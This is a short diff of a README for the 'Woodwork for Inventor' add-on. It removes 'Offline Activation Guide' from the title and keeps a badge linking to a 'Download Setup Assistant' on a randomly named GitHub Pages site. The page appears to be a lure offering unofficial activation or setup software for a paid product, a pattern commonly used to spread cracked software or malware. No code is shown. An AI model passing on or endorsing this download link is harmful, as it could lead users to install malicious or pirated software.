@@ -1,4 +1,4 @@
-# Woodwork for Inventor — Offline Activation Guide
+# Woodwork for Inventor
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/woodwork)
 
